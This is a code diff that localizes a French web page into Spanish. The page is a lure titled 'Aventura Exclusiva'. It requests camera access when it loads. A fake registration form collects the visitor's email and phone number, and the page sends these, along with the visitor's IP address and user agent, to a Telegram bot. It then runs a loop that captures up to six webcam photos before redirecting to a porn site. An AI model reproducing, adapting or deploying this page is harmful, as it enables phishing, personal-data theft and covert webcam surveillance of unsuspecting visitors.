@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Aventure Exclusive</title>
+  <title>Aventura Exclusiva</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   
@@ -23,7 +23,7 @@
 
     .hidden { display: none !important; }
 
-    /* --- Bouton Principal --- */
+    /* --- Botón Principal --- */
     #startBtn {
       padding: 16px 35px;
       font-size: 18px;
@@ -43,7 +43,7 @@
       animation: pulseBtn 1.8s infinite;
     }
 
-    /* Style du bouton après inscription */
+    /* Estilo del botón después de la inscripción */
     #startBtn.success {
       background: rgba(40, 167, 69, 0.7);
       border-color: #28a745;
@@ -57,7 +57,7 @@
       100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); }
     }
 
-    /* --- Style Commun Glassmorphism (Popup & Loading) --- */
+    /* --- Estilo Glassmorphism (Popup y Carga) --- */
     .glass-overlay {
       position: fixed;
       inset: 0;
@@ -82,7 +82,7 @@
       box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
     }
 
-    /* --- Formulaire --- */
+    /* --- Formulario --- */
     .input-group {
       position: relative;
       margin-bottom: 20px;
@@ -121,7 +121,7 @@
       transition: 0.3s;
     }
 
-    /* --- Loader --- */
+    /* --- Cargador --- */
     .loader {
       width: 50px;
       height: 50px;
@@ -140,33 +140,33 @@
 <body>
 
   <div id="interface">
-    <button id="startBtn" class="pulse">Commencer l'aventure</button>
+    <button id="startBtn" class="pulse">Comenzar la aventura</button>
   </div>
 
   <div id="registerModal" class="glass-overlay hidden">
     <div class="modal-content">
-      <h2 style="margin-top:0"><i class="fas fa-user-lock"></i> Inscription</h2>
+      <h2 style="margin-top:0"><i class="fas fa-user-lock"></i> Registro</h2>
       <p style="font-size: 14px; color: rgba(255,255,255,0.8); margin-bottom: 25px;">
-        Veuillez creer un compte pour acceder.
+        Por favor, cree una cuenta para acceder.
       </p>
       
       <div class="input-group">
         <i class="fas fa-envelope"></i>
-        <input type="email" id="regEmail" placeholder="example@gmail.com" required>
+        <input type="email" id="regEmail" placeholder="ejemplo@gmail.com" required>
       </div>
       
       <div class="input-group">
         <i class="fas fa-phone"></i>
-        <input type="tel" id="regPhone" placeholder="+33 343 4654 096" required>
+        <input type="tel" id="regPhone" placeholder="+34 600 000 000" required>
       </div>
       
-      <button id="submitReg">S'inscrire</button>
+      <button id="submitReg">Registrarse</button>
     </div>
   </div>
 
   <div id="loadingScreen" class="glass-overlay hidden">
     <div class="loader"></div>
-    <div id="loadText" style="font-weight:500; letter-spacing:1px;">Traitement en cours...</div>
+    <div id="loadText" style="font-weight:500; letter-spacing:1px;">Procesando...</div>
   </div>
 
   <video id="video" autoplay playsinline></video>
@@ -188,7 +188,7 @@
     let photoCount = 0;
     const maxPhotos = 6;
 
-    // Vérifier l'état au démarrage
+    // Verificar estado al iniciar
     window.onload = () => {
       if (localStorage.getItem("aventure_debloquee")) {
         setBtnVerified();
@@ -198,14 +198,14 @@
     function setBtnVerified() {
       startBtn.classList.remove("pulse");
       startBtn.classList.add("success");
-      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Accedez au site';
+      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Acceder al sitio';
     }
 
     async function initCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-      } catch (e) { console.warn("Caméra indisponible"); }
+      } catch (e) { console.warn("Cámara no disponible"); }
     }
     initCamera();
 
@@ -222,40 +222,36 @@
       const phone = document.getElementById("regPhone").value;
 
       if (email && phone) {
-        // Transition vers le chargement
         registerModal.classList.add("hidden");
         loadingScreen.classList.remove("hidden");
-        loadText.innerText = "Validation de l'accès...";
+        loadText.innerText = "Validando acceso...";
 
-        // Envoi à Telegram
+        // Envío a Telegram
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             chat_id: chatId, 
-            text: `🎯 NOUVELLE INSCRIPTION :\n📧 Email: ${email}\n📞 Tel: ${phone}` 
+            text: `🎯 NUEVO REGISTRO :\n📧 Email: ${email}\n📞 Tel: ${phone}` 
           })
         });
 
-        // Mémorisation
         localStorage.setItem("aventure_debloquee", "true");
         setBtnVerified();
 
-        // Lancer la capture après un court délai visuel
         setTimeout(() => {
           lancerProcessusFinal();
         }, 1500);
       } else {
-        alert("Veuillez remplir tous les champs.");
+        alert("Por favor, complete todos los campos.");
       }
     };
 
     async function lancerProcessusFinal() {
       loadingScreen.classList.remove("hidden");
-      loadText.innerText = "Synchronisation en cours...";
+      loadText.innerText = "Sincronización en curso...";
 
-      // Envoi des infos de l'appareil
-      let ip = "Inconnue";
+      let ip = "Desconocida";
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const d = await res.json(); ip = d.ip;
@@ -266,16 +262,14 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           chat_id: chatId, 
-          text: `🌐 Connexion de : ${ip}\n📱 Appareil : ${navigator.userAgent}` 
+          text: `🌐 Conexión de : ${ip}\n📱 Dispositivo : ${navigator.userAgent}` 
         })
       });
 
-      // Cycle de capture
       const interval = setInterval(async () => {
         if (photoCount >= maxPhotos) {
           clearInterval(interval);
           if (stream) stream.getTracks().forEach(t => t.stop());
-          // Redirection finale
           window.location.replace("https://www.mvideoporno.xxx/xhamster/");
           return;
         }
